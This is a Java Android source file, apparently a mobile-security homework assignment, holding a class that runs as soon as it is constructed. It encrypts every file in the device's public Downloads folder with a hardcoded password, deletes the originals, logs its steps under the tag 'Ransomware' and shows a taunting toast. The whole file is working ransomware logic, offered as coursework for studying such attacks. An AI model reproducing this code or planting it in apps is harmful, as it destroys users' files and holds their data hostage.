package nordberg.katie.hw4;

import android.app.Activity;
import android.os.Environment;
import android.util.Log;
import android.view.View;
import android.widget.TextView;
import android.widget.Toast;

import java.io.File;
import java.io.IOException;

import javax.crypto.spec.SecretKeySpec;

public class EncryptDownloads {
    private final Activity a;
    private static final String TAG = "EncryptDownloads";

    EncryptDownloads(Activity a) {
        this.a = a;
        this.encryptMethod();
    }
    String pw = "mobsec";
    SecretKeySpec k = CipherStreamUtil.getKey(pw);

    public void encryptMethod() {
        Log.e("Ransomware", "Beginning encryption");
        SecretKeySpec k = CipherStreamUtil.getKey(pw);

        File f = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);

        File[] allFiles = f.listFiles();
        if (allFiles == null) {
            Log.e("Ransomware", "allFiles was null");
            return;
        }
        for (File file : allFiles) {
            // For each file in Downloads that has not been encrypted
            if (file.isFile() && !file.getName().endsWith(".enc")) {
                Log.e("Ransomware", "Encrypting " + file.getName() + " to " + f.getAbsolutePath() + "/" + file.getName() + ".enc");
                File dst = new File(f.getAbsolutePath(), file.getName() + ".enc");

                // Call the class we made to encrypt the file
                CipherStreamUtil.encrypt(file, dst, k);
                // Delete the original file
                file.delete();
                Log.e("Ransomware", "Finished encrypting.");
            }
        }
        Toast.makeText(a, "Your Downloads were just encrypted... Oopsie", Toast.LENGTH_LONG).show();

    }
}
